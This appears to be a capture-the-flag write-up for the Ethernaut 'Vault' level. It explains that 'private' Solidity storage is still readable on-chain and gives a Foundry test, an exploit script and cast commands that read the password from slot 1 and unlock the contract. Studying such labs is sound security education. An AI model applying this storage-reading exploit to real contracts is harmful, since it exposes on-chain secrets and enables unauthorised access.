## Vault

<br>


### tl; dr

<br>


* this challenge explores the fact that if a state variable is declared `private`, it's only hidden from other contracts (private within the contract's scope). however, its value is still recorded in the blockchain (and is open to anyone who understands how memory is organized).

<br>
  
<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/1130416/9863a3ce-ee78-4d75-861e-85691e44cbea">
</p>


<br>

```solidity
contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```


<br>

---

### discussion

<br>

* the first thing we see in the contract is the two state variables set as `private`. in particular, `password` is declared as `byte32`, which makes this problem even simpler (hint: remember that **[the EVM operates on 32 bytes at a time](https://docs.soliditylang.org/en/v0.8.21/internals/layout_in_storage.html)**):

<br>

```solidity
bool private locked; 
bytes32 private password;
```

<br>

* looking at the constructor, we see that `password` is given as input by whoever deploys this contract (and also setting the variable `locked` to `True`):

<br>

```solidity
  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }
```

<br>

* finally, we look at the only function in the contract. it "unlocks" `locked` when given the correct password:

<br>

```solidity
function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
}
```

<br> 

* there are many ways to solve this exercise, but the theory is the same: each smart contract has its own storage reflecting the state of the contract, which is divided into 32-byte slots.

* a first approach is simply call the well-known API `web3.eth.getStorageAt(contractAddress, slotNumber)`. we know the contract address and that `password` is on slot number `1`:

<br>

```shell
> await web3.eth.getStorageAt("<contract address>, 1")
```
<br>

* however, we use a more formal approach that leverages **[foundry's `vm.load()` method](https://book.getfoundry.sh/cheatcodes/load?highlight=vm.load#examples)**:


<br>

```
function load(address account, bytes32 slot) external returns (bytes32);
```

<br>

* from the foundry book, here is a straightforward illustration:

<br>

```
/// contract LeetContract {
///     uint256 private leet = 1337; // slot 0
/// }

bytes32 leet = vm.load(address(leetContract), bytes32(uint256(0)));
emit log_uint(uint256(leet)); // 1337
```



<br>



----

### solution

<br>

* check `test/.t.sol`:

<br>

```solidity
contract VaultTest is Test {

    Vault public level;

    address instance = vm.addr(0x1); 
    address hacker = vm.addr(0x2); 

    function setUp() public {

        vm.prank(instance);    
    
    }

    function testVaultHack() public {

        vm.startPrank(hacker);
        
        bytes32 password = vm.load(instance, bytes32(uint256(1)));
        level = new Vault(password);
        level.unlock(password);
        assert(level.locked() == false);
        
        vm.stopPrank();
        
    }
}
```

<br>

* run the test with:

<br>

```shell
> forge test --match-contract Test -vvvv    
```



<br>

* then submit the solution with `script/.s.sol`:

<br>

```solidity
contract Exploit is Script {

        address instance = 0x6d1BEEa9eD0E145B98308DA049E371fA0C8bc923;
        Vault level = Vault(instance);        
        
        function run() external {

            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            
            bytes32 password = vm.load(instance, bytes32(uint256(1)));
            level.unlock(password);
            console.log(level.locked());
            
            vm.stopBroadcast();
    }
}
```

<br>

* by running:

<br>

```shell
> forge script ./script/08/Vault.s.sol --broadcast -vvvv --rpc-url sepolia
```

<br>


---

### solution using `cast`

<br>

* get the password with:

<br>

```shell
> cast storage <contract address> 1 --private-key=<private-key> --rpc-url=<sepolia url> 
```

<br>

* run in the console:

<br>

```shell
> await contract.unlock(<password>)
```

<br>

----

### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



<br>

---

### further resources

<br>

* **[solidity docs on slots](https://docs.soliditylang.org/en/v0.8.21/internals/layout_in_storage.html)**
